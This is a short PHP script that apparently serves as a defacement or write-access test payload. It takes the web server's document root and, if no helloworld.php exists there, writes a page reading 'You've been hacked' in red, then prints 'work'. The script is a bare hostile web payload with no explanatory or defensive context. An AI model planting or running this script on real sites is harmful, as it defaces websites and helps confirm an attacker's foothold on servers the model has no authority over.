<?php 
    $DIR =  $_SERVER['DOCUMENT_ROOT'];
    $test = "<b style='color: red'>You've been hacked</b>";
    if(!file_exists($DIR.'/helloworld.php')){
        file_put_contents($DIR.'/helloworld.php', $test);
        echo 'work';
    }
?>